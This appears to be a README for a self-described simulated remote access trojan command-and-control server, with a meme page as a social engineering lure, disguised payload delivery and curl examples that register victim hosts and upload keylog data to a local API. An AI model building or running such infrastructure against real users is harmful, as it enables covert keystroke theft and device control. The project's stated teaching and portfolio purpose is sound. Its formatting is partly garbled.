# CosmicRAT - Cross-Platform C2 Server Demo

‚ö†Ô∏è **EDUCATIONAL PURPOSE ONLY** ‚ö†Ô∏è

This is a **simulated RAT (Remote Access Trojan) demonstration** created for educational and portfolio purposes only. This project is designed to help understand cybersecurity concepts, threat analysis, and defensive strategies.

**IMPORTANT DISCLAIMERS:**
- This is NOT intended for malicious use
- All payloads are dummy/harmless files
- This is for cybersecurity education and demonstration only
- Use only in controlled, authorized environments
- Always comply with local laws and regulations

## üöÄ Project Overview

CosmicRAT simulates a cross-platform RAT backend server with:
- Meme delivery page as a social engineering front
- Disguised payload delivery system (dummy files only)
- Command & Control (C2) server functionality
- REST API for data collection and management
- SQLite database for storing simulated client data

curl -X POST http://localhost:5000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "demo-client-001",
    "hostname": "demo-pc",
    "os": "Windows 10",
    "ip": "192.168.1.100"
  }'
```

### Upload Keylog Data
```bash
curl -X POST http://localhost:5000/api/upload/keylogs \
  -H "Content-Type: application/json" \
  -d '{
    "client_id": "demo-client-001",
    "keylogs": [
      {
        "timestamp": "2024-01-15T10:30:00",
        "window_title": "Notepad",
        "keystrokes": "Hello World [DEMO]"
      }
    ]
  }'
```
